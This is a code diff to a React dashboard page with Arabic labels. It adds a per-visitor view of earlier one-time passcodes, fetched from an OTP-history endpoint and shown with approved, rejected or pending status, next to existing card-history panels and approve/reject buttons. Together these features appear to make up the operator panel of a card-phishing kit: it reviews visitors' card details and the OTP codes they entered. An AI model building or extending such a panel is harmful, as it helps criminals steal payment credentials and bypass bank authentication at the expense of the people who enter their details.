@@ -262,6 +262,9 @@ export default function DashboardPage() {
   const [expandedCards, setExpandedCards] = useState<Record<string, boolean>>({});
   const [cardsHistory, setCardsHistory] = useState<Record<string, any[]>>({});
   const [hasCardHistory, setHasCardHistory] = useState<Record<string, boolean>>({});
+  const [expandedOtpCodes, setExpandedOtpCodes] = useState<Record<string, boolean>>({});
+  const [otpCodesHistory, setOtpCodesHistory] = useState<Record<string, any[]>>({});
+  const [hasOtpHistory, setHasOtpHistory] = useState<Record<string, boolean>>({});
 
   // Toggle card history expansion
   const toggleCardHistory = async (visitorId: string) => {
@@ -283,6 +286,28 @@ export default function DashboardPage() {
     }
     
     setExpandedCards(prev => ({ ...prev, [visitorId]: !isExpanded }));
+  };
+
+  // Toggle OTP codes history expansion
+  const toggleOtpHistory = async (visitorId: string) => {
+    const isExpanded = expandedOtpCodes[visitorId];
+    
+    if (!isExpanded) {
+      // Fetch history when expanding
+      try {
+        const res = await fetch(`/api/dashboard/otp-history/${visitorId}`);
+        if (res.ok) {
+          const data = await res.json();
+          const codes = data.codes || [];
+          setOtpCodesHistory(prev => ({ ...prev, [visitorId]: codes }));
+          setHasOtpHistory(prev => ({ ...prev, [visitorId]: codes.length > 0 }));
+        }
+      } catch {
+        console.error("Failed to fetch OTP history");
+      }
+    }
+    
+    setExpandedOtpCodes(prev => ({ ...prev, [visitorId]: !isExpanded }));
   };
 
   // Get latest card data from selected request
@@ -1911,6 +1936,77 @@ export default function DashboardPage() {
             >
               ❌ رفض
             </button>
+          </div>
+        )}
+
+        {/* زر عرض الرموز السابقة */}
+        {hasOtpHistory[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+          <div style={{ marginTop: 12 }}>
+            <button
+              onClick={() => toggleOtpHistory(selectedRequest?.id || selectedRequest?.visitorId || "")}
+              style={{
+                width: "100%",
+                padding: "8px 16px",
+                borderRadius: 8,
+                border: "1px solid #e5e7eb",
+                background: expandedOtpCodes[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "#f3f4f6" : "#ffffff",
+                color: "#374151",
+                fontSize: "0.75rem",
+                fontWeight: 600,
+                cursor: "pointer",
+                display: "flex",
+                alignItems: "center",
+                justifyContent: "center",
+                gap: 6
+              }}
+            >
+              {expandedOtpCodes[selectedRequest?.id || selectedRequest?.visitorId || ""] ? "🔼 إخفاء السجلات" : `📋 عرض ${otpCodesHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.length || 0} رموز سابقة`}
+            </button>
+
+            {/* سجلات الرموز */}
+            {expandedOtpCodes[selectedRequest?.id || selectedRequest?.visitorId || ""] && (
+              <div style={{ 
+                marginTop: 8,
+                maxHeight: 300,
+                overflowY: "auto"
+              }}>
+                {otpCodesHistory[selectedRequest?.id || selectedRequest?.visitorId || ""]?.map((item: any, idx: number) => (
+                  <div key={idx} style={{
+                    background: "#f9fafb",
+                    borderRadius: 8,
+                    padding: 12,
+                    marginBottom: 8,
+                    border: "1px solid #e5e7eb",
+                    textAlign: "center"
+                  }}>
+                    <div style={{ fontSize: "0.7rem", fontWeight: 600, color: "#374151", marginBottom: 4 }}>
+                      رمز سابق #{idx + 1}
+                    </div>
+                    <div style={{
+                      fontFamily: "ui-monospace, monospace",
+                      fontSize: "1.4rem",
+                      fontWeight: 700,
+                      color: "#0a4a68",
+                      letterSpacing: "6px",
+                      direction: "ltr",
+                      marginBottom: 4
+                    }}>
+                      {item.code}
+                    </div>
+                    <div style={{
+                      fontSize: "0.65rem",
+                      padding: "2px 6px",
+                      borderRadius: 4,
+                      display: "inline-block",
+                      background: item.status === "approved" ? "#dcfce7" : item.status === "rejected" ? "#fee2e2" : "#fef3c7",
+                      color: item.status === "approved" ? "#166534" : item.status === "rejected" ? "#991b1b" : "#92400e"
+                    }}>
+                      {item.status === "approved" ? "✅" : item.status === "rejected" ? "❌" : "⏳"} {item.status}
+                    </div>
+                  </div>
+                ))}
+              </div>
+            )}
           </div>
         )}
 
